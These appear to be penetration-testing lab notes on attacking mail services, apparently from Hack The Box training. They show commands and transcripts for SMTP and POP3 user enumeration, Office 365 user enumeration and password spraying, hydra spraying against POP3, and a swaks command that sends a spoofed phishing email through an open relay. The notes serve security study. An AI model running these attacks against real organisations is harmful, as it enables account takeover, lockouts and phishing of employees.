

Common Ports
![[Pasted image 20240924215757.png]]

nmap scan 
```shell-session
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
```


Finding mail servers

```shell-session
host -t MX hackthebox.eu
```

Finding ip address linked to mail server through A record
```shell-session
host -t A mail1.inlanefreight.htb
```


Using telnet for email enumeration via VRFY function
```shell-session
Auzzie@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


VRFY root

252 2.0.0 root


VRFY www-data

252 2.0.0 www-data


VRFY new-user

550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
```

Using telnet for user enumeration 
```shell-session
Auzzie@htb[/htb]$ telnet 10.10.110.20 110

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
+OK POP3 Server ready

USER julio

-ERR


USER john

+OK
```

Using telnet to list email distribution list via EXPN
```shell-session
Auzzie@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


EXPN john

250 2.1.0 john@inlanefreight.htb


EXPN support-team

250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
```


Using telnet to perform recipient enumeration via RCPT TO
```shell-session
Auzzie@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


MAIL FROM:test@htb.com
it is
250 2.1.0 test@htb.com... Sender ok


RCPT TO:julio

550 5.1.1 julio... User unknown
```

Automated tools 
https://github.com/pentestmonkey/smtp-user-enum
```shell-session
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

Office365 username enumeration
https://github.com/0xZDH/o365spray

Check if using office 365
```shell-session
python3 o365spray.py --validate --domain msplaintext.xyz
```

Office 365 user enumeration
```shell-session
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz   
```

Office 365 password spraying
```shell-session
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

Password spraying via pop3
```shell-session
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```

Identifying open relay mail servers
```shell-session
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
```

Abusing open relay to send email
```shell-session
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```
